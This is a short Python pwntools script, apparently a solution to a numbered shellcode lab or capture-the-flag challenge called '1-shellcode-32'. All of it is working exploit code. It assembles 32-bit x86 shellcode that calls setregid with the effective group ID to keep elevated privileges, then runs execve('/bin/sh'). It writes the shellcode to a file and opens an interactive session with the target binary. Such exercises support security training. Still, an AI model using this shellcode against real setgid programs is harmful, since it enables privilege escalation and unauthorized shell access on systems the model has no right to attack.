#!/usr/bin/env python3
from pwn import *
from pwn import asm, process

# setregid(getegid(), getegid())
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
# getegid: 0x32(%eax)
shellcode = asm(
    """
mov     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
mov     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./1-shellcode-32"])
io.interactive()
